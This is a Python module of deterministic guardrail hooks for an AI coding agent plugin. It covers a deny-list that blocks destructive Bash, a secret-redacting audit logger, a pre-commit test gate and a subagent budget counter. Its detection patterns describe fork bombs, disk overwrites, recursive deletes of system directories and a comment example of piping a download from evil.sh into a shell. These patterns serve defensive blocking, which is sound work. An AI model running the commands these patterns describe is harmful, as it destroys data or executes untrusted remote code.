"""Deterministic L4 guardrail logic (ADR 0019).

The hook scripts under ``plugin/hooks/scripts/`` are thin: they parse the Claude Code hook
payload and call these tested functions. Every decision here is deterministic so it is fast,
predictable, and unit-testable without a model.

- :func:`classify_command` — the **security** deny-list (block clearly-dangerous Bash).
- :func:`is_commit_or_push` / :func:`choose_gate` — the **test-gate** (which fast gate to run
  before a commit/push).
- :func:`redact_secrets` / :func:`audit_record` — the **logging** audit record.
- :func:`bump_and_check` — the **budgets** subagent counter (warn/block).
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass
from pathlib import Path
from typing import Any

__all__ = [
    "Decision",
    "ALLOW",
    "classify_command",
    "is_commit_or_push",
    "choose_gate",
    "redact_secrets",
    "audit_record",
    "bump_and_check",
]


@dataclass(frozen=True)
class Decision:
    """A guardrail outcome. ``block`` -> the hook exits 2; a non-empty ``message`` with
    ``block=False`` -> a non-blocking warning (the hook prints it and exits 0)."""

    block: bool
    message: str = ""


ALLOW = Decision(False)


# --- security: dangerous-command deny-list -----------------------------------

# A target that means "everything": filesystem root, home, or a top-level system dir (NOT
# /tmp/x, ./build, ~/Downloads). Quotes are stripped before matching so "/" and '/usr' are seen.
_DANGER_TARGET = re.compile(
    r"(?:^|\s)(?:"
    r"/\*?"  # / or /*
    r"|~/?|\$HOME/?|\$\{HOME\}/?"  # home
    r"|/(?:usr|etc|bin|sbin|lib|lib64|boot|var|opt|root|home)(?:/\S*)?"  # system dirs
    r")(?:\s|$)"
)
_RM = re.compile(r"\brm\b")
_RM_RECURSIVE = re.compile(r"(?<![\w-])-\w*[rR]\w*\b|--recursive\b")
_RM_FORCE = re.compile(r"(?<![\w-])-\w*f\w*\b|--force\b")

_CHMOD = re.compile(r"\bchmod\b")
_CHMOD_RECURSIVE = re.compile(r"(?<![\w-])-\w*R\w*\b|--recursive\b")
# a permissive mode: 777 (any leading digit) or a symbolic grant of write/all (a+rwx, o+w, +w).
# NB: the symbolic clause is anchored with (?<![\w+=]) so re.search can't retry [ugoa]* at every
# position of a long run — without it a crafted `chmod -R ugoa…ugoa /etc` is quadratic ReDoS.
_PERMISSIVE_MODE = re.compile(r"(?<!\d)[0-7]?777\b|(?<![\w+=])[ugoa]*\+[rwxX]*[wx][rwxX]*|a=rwx\b")

_BLOCKERS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"), "fork bomb"),
    (
        # mkfs/dd with a /dev/ device argument (command-bounded so "echo mkfs" / "git grep mkfs"
        # and "dd if=/dev/sda of=backup" are NOT blocked).
        re.compile(r"\bmkfs(\.\w+)?\b[^\n;&|]*/dev/|\bdd\b[^\n;&|]*\bof=/dev/"),
        "overwrite a filesystem/disk device",
    ),
    (re.compile(r">\|?\s*/dev/(sd[a-z]|nvme\d|disk\d|mapper/)"), "write to a raw disk device"),
]
# git push, tolerating global flags before the subcommand: `git -C dir push`, `git -c k=v push`,
# `git --no-pager push` (the old `git\s+push` missed these).
_GIT_PUSH = re.compile(r"\bgit\s+(?:-[cC]\s+\S+\s+|--\S+\s+|-\w\s+)*push\b")
_FORCE_FLAG = re.compile(r"--force\b|--force-with-lease\b|(?<![\w-])-\w*f\w*\b")
# a protected branch as a standalone arg OR a refspec destination (RHS of `src:dst`): `origin
# main`, `HEAD:main`, `develop:main` all match — but NOT release-2024 / feature/main-fix.
_PROTECTED_DEST = re.compile(r"(?:^|\s|:)\+?(?:main|master|release)(?::|\s|$)")
# a `+`-forced refspec whose destination is protected (force-push without the --force flag).
_PLUS_PROTECTED = re.compile(r"(?:^|\s)\+(?:\S*:)?(?:main|master|release)(?::|\s|$)")

_SEGMENT_SEP = re.compile(r"&&|\|\||[;\n|]")


def _segments(command: str) -> list[str]:
    """Split a command line into segments on shell separators (`;`, `&&`, `||`, `|`, newline) so a
    co-occurrence check only fires when its parts live in ONE command — e.g. `ls /usr && rm -rf
    build` must not be read as `rm -rf /usr`."""
    return [seg for seg in _SEGMENT_SEP.split(command) if seg.strip()]


def _seg_dangerous_rm(segment: str) -> bool:
    if not _RM.search(segment):
        return False
    unquoted = segment.replace('"', " ").replace("'", " ")  # so "/" and '/usr' are seen
    return bool(
        _RM_RECURSIVE.search(segment)
        and _RM_FORCE.search(segment)
        and _DANGER_TARGET.search(unquoted)
    )


def _dangerous_rm(command: str) -> bool:
    """True for a recursive+forced ``rm`` whose target is the root, home, or a system dir."""
    return any(_seg_dangerous_rm(seg) for seg in _segments(command))


def _seg_dangerous_chmod(segment: str) -> bool:
    if not _CHMOD.search(segment):
        return False
    unquoted = segment.replace('"', " ").replace("'", " ")
    return bool(
        _CHMOD_RECURSIVE.search(segment)
        and _PERMISSIVE_MODE.search(segment)
        and _DANGER_TARGET.search(unquoted)
    )


def _dangerous_chmod(command: str) -> bool:
    """True for a recursive chmod granting write/all perms on the root, home, or a system dir."""
    return any(_seg_dangerous_chmod(seg) for seg in _segments(command))


_FIND = re.compile(r"\bfind\b")
_FIND_DELETE = re.compile(r"(?<![\w-])-delete\b")
# a bare top-level root as find's start path (NOT a sub-path like /opt/app or /etc/x, which are
# targeted) — so `find /etc -delete` blocks but `find /opt/app -name '*.tmp' -delete` does not.
_FIND_TARGET = re.compile(
    r"(?:^|\s)(?:/\*?|~/?|\$HOME/?|\$\{HOME\}/?"
    r"|/(?:usr|etc|bin|sbin|lib|lib64|boot|var|opt|root|home)/?)(?:\s|$)"
)


def _seg_dangerous_find(segment: str) -> bool:
    if not (_FIND.search(segment) and _FIND_DELETE.search(segment)):
        return False
    return bool(_FIND_TARGET.search(segment.replace('"', " ").replace("'", " ")))


def _dangerous_find(command: str) -> bool:
    """True for `find <root-or-system-dir> … -delete` — deleting a whole system tree. A sub-path
    (`/opt/app`, `/etc/x`) is targeted cleanup and is NOT blocked (accident-guard scope)."""
    return any(_seg_dangerous_find(seg) for seg in _segments(command))


def _seg_dangerous_push(segment: str) -> bool:
    if not _GIT_PUSH.search(segment):
        return False
    if _PLUS_PROTECTED.search(segment):
        return True
    return bool(_FORCE_FLAG.search(segment) and _PROTECTED_DEST.search(segment))


def _dangerous_push(command: str) -> bool:
    """True for a force-push (``--force``/``-f`` or a ``+refspec``) to a protected branch. A bare
    `git push --force` (no explicit target) is intentionally NOT blocked — the destination branch
    is not knowable from the command string (accident-guard scope; see guardrails.md)."""
    return any(_seg_dangerous_push(seg) for seg in _segments(command))


# --- security: network-download-into-a-bare-interpreter (RCE) ----------------
# The `curl https://evil.sh | sh` accidental-RCE shape, aimed narrowly (ADR 0051): a download in
# COMMAND POSITION feeding a BARE interpreter (stdin becomes the program) from a NON-loopback host.
# Split groups on `;`/`&`/newline (the boundaries the old regex respected); the pipe chain lives in
# one group, so stages are split on `|`.
_NET_GROUP_SEP = re.compile(r"[;&\n]")
# a download tool as the leading word of a pipe stage (tolerating env-var + `sudo` prefixes).
_NET_DL = re.compile(r"^\s*(?:\w+=\S+\s+)*(?:sudo\s+)?(?:curl|wget|fetch)\b")
# an interpreter as the leading word of a pipe stage; group(1) = name, group(2) = its arguments.
_NET_INTERP = re.compile(
    r"^\s*(?:\w+=\S+\s+)*(?:sudo\s+)?((?:ba|z|k|da)?sh|python3?|perl|ruby|node)\b(.*)$"
)
# a loopback target anywhere in the group means "my own machine" — not an untrusted remote.
_NET_LOOPBACK = re.compile(r"localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\]|(?<![\w.])::1(?![\w.])")
# markers that an interpreter was handed an explicit program, so stdin is DATA (not the program):
_NET_PROG_C = re.compile(r"(?:^|\s)-c(?:\s|=|$)")  # inline command/script (all interpreters)
_NET_PROG_EVAL = re.compile(r"(?:^|\s)(?:-m|-e|-E|-p|--eval)\b")  # non-shell eval/module flags
_NET_SCRIPT_FILE = re.compile(r"(?:^|\s)[^\s|>&-]\S*\.(?:py|sh|bash|zsh|rb|pl|js|mjs|cjs)\b")
_NET_SH_FAMILY = {"sh", "bash", "zsh", "ksh", "dash"}


def _interp_reads_stdin_as_program(name: str, rest: str) -> bool:
    """True iff a piped interpreter would execute stdin AS ITS PROGRAM (the RCE case). False when it
    was handed an explicit program: `-c` (any), a script-file arg (any), or `-m`/`-e`/`-E`/`-p`/
    `--eval` for the NON-shell interpreters. A shell's `-e` is errexit (not eval), so `bash -e` is
    still treated as reading stdin — `curl … | bash -e` stays blocked."""
    if _NET_PROG_C.search(rest) or _NET_SCRIPT_FILE.search(rest):
        return False
    if name not in _NET_SH_FAMILY and _NET_PROG_EVAL.search(rest):
        return False
    return True


def _dangerous_net_pipe(command: str) -> bool:
    """True for a network download in command position piped into a bare interpreter from a
    non-loopback host (ADR 0051). Conservative: loopback targets, interpreters given an explicit
    program, and `curl`/`wget` appearing only as literal text are all allowed."""
    for group in _NET_GROUP_SEP.split(command):
        if _NET_LOOPBACK.search(group):
            continue
        stages = group.split("|")
        dl_idx = next((i for i, s in enumerate(stages) if _NET_DL.match(s)), None)
        if dl_idx is None:
            continue
        for stage in stages[dl_idx + 1 :]:
            m = _NET_INTERP.match(stage)
            if m and _interp_reads_stdin_as_program(m.group(1), m.group(2)):
                return True
    return False


def classify_command(command: str) -> Decision:
    """Block (Decision.block) a clearly-dangerous Bash command; otherwise ALLOW.

    Conservative by design — a false block causes friction, so only unambiguous hazards match.
    Co-occurrence checks (rm/chmod/push) run per shell segment so an unrelated clause cannot
    poison the line (e.g. `ls /usr && rm -rf build` is allowed).
    """
    if _dangerous_net_pipe(command):
        return Decision(True, "blocked: pipe a network download into a shell")
    if _dangerous_rm(command):
        return Decision(True, "blocked: recursive/forced delete of /, home, or a system dir")
    if _dangerous_chmod(command):
        return Decision(True, "blocked: recursive permissive chmod of /, home, or a system dir")
    if _dangerous_find(command):
        return Decision(True, "blocked: find -delete of /, home, or a system dir")
    for pattern, reason in _BLOCKERS:
        if pattern.search(command):
            return Decision(True, f"blocked: {reason}")
    if _dangerous_push(command):
        return Decision(True, "blocked: force-push to a protected branch (main/master/release)")
    return ALLOW


# --- test-gate: fast gate before commit/push ---------------------------------

# git commit/push in command position (not "echo 'git commit'"), tolerating an env-var prefix
# (`VAR=val git commit`) and git global flags (`git -c k=v commit`, `git -C dir commit`).
_COMMIT_PUSH = re.compile(
    r"(?:^|[\n;&|]\s*)(?:\w+=\S+\s+)*git\s+(?:-[cC]\s+\S+\s+|--\S+\s+|-\w\s+)*(?:commit|push)\b"
)


def is_commit_or_push(command: str) -> bool:
    return bool(_COMMIT_PUSH.search(command))


def choose_gate(cwd: Path | str) -> list[str] | None:
    """The fast gate command to run before a commit/push, or None if no gate applies.

    Prefers the repo's own Tier-0 validator (`dev/validate.py`); otherwise the detected stack's
    lint command (by-stack). None means "nothing fast to check" (don't block).
    """
    cwd = Path(cwd)
    if (cwd / "dev" / "validate.py").is_file():
        return ["python", "dev/validate.py"]
    from agentic_forge import stacks

    lint = stacks.primary(cwd).toolchain.lint
    return lint.split() if lint else None


# --- logging: redacted audit record ------------------------------------------

_SECRETS = [
    # Prefixed API keys/tokens. Anthropic/OpenAI prefixes are matched explicitly (their bodies hold
    # internal hyphens, e.g. sk-ant-api03-…); the bare sk- form requires a hyphen-free run so an
    # ordinary hyphenated arg like `sk-region-us-east-1` is not blanked. Highest-value leak: this is
    # Anthropic's own tooling writing to an on-disk audit log.
    re.compile(r"\bsk-ant-[A-Za-z0-9_-]{16,}"),  # Anthropic
    re.compile(r"\bsk-proj-[A-Za-z0-9_-]{16,}"),  # OpenAI project
    re.compile(r"\bsk-[A-Za-z0-9]{20,}\b"),  # bare OpenAI (no internal hyphens)
    re.compile(r"\b[sr]k_(?:live|test)_[A-Za-z0-9]{16,}\b"),  # Stripe secret + restricted keys
    re.compile(r"\bgh[opsru]_[A-Za-z0-9]{20,}\b"),  # GitHub tokens (ghp/gho/ghs/ghr/ghu)
    re.compile(r"\bgithub_pat_[A-Za-z0-9_]{20,}\b"),  # GitHub fine-grained PAT
    re.compile(r"\bglpat-[A-Za-z0-9_\-]{16,}\b"),  # GitLab PAT
    re.compile(r"\bAKIA[0-9A-Z]{16}\b"),  # AWS access-key id
    re.compile(r"\bAIza[0-9A-Za-z_\-]{35}\b"),  # Google API key
    re.compile(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b"),  # Slack
    re.compile(r"\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}"),  # JWT
    re.compile(r"-----BEGIN[^-]*PRIVATE KEY-----[\s\S]*?-----END[^-]*-----"),
    re.compile(r"(?<=://)[^/\s:@]+:[^/\s@]+(?=@)"),  # user:password in a URL
    re.compile(r"(?i)\bauthorization\b\s*:\s*\S+(\s+\S{4,})?"),
    re.compile(r"(?i)\bBearer\s+[A-Za-z0-9._\-]{16,}"),
    # key=value / key: value assignments. No leading \b on the keyword so AWS_SECRET_ACCESS_KEY
    # (underscore-joined, no word boundary before "secret") is still caught.
    re.compile(
        r"(?i)(api[_-]?key|secret\w*|access[_-]?key|token|password|passwd)"
        r"\s*[:=]\s*['\"]?[^\s'\"]{6,}"
    ),
]


def redact_secrets(text: str) -> str:
    """Replace secret-looking substrings with a placeholder (for safe audit logging)."""
    for pattern in _SECRETS:
        text = pattern.sub("[REDACTED]", text)
    return text


def _redact_truncate(value: Any, max_len: int) -> Any:
    """Redact + per-VALUE truncate ``tool_input`` so re-encoding yields VALID JSON (ADR 0052).

    The old approach truncated the whole JSON dump, corrupting long records mid-encoding; here each
    string is redacted then capped, and containers are walked, so `json.dumps` of the result parses
    cleanly and a downstream tool can recover each (capped) field."""
    if isinstance(value, str):
        red = redact_secrets(value)
        return red if len(red) <= max_len else red[:max_len] + "…"
    if isinstance(value, dict):
        return {str(k): _redact_truncate(v, max_len) for k, v in value.items()}
    if isinstance(value, list):
        return [_redact_truncate(v, max_len) for v in value]
    return value  # numbers / bools / None pass through unchanged


def audit_record(
    payload: dict[str, Any], *, max_len: int = 300, ts: str | None = None
) -> dict[str, Any]:
    """Build a compact, secret-redacted audit record from a PostToolUse hook payload. The ``input``
    field is a **valid** JSON string (each ``tool_input`` value redacted + capped, then re-encoded),
    so long records stay machine-readable (ADR 0052). ``ts`` (an ISO timestamp the impure hook
    stamps) is recorded when given, so the audit trail is time-windowable (ADR 0053); pure — the
    caller supplies the clock."""
    tool = str(payload.get("tool_name") or payload.get("tool") or "unknown")[:128]
    tool_input = payload.get("tool_input")
    if not isinstance(tool_input, dict):
        tool_input = {}
    brief = json.dumps(_redact_truncate(tool_input, max_len), sort_keys=True)
    record: dict[str, Any] = {"tool": tool, "input": brief}
    if ts:
        record["ts"] = str(ts)
    if payload.get("session_id"):
        record["session_id"] = str(payload["session_id"])[:128]
    return record


# --- budgets: per-session subagent counter -----------------------------------


def bump_and_check(counter_path: Path | str, *, soft: int, hard: int) -> Decision:
    """Increment the counter at ``counter_path`` and decide warn/block against soft/hard caps.

    Over ``hard`` -> block; over ``soft`` -> a non-blocking warning; otherwise ALLOW. The counter
    is a tiny integer file (one per session), so the budget is enforced across hook invocations.
    """
    path = Path(counter_path)
    try:
        # max(0, ...) so a hand-edited negative value can't silently disarm the cap
        count = max(0, int(path.read_text(encoding="utf-8").strip()))
    except (FileNotFoundError, ValueError):
        count = 0
    count += 1
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(str(count), encoding="utf-8")
    if count > hard:
        return Decision(True, f"blocked: subagent budget exceeded ({count} > hard cap {hard})")
    if count > soft:
        return Decision(False, f"warning: {count} subagents this session (soft cap {soft})")
    return ALLOW
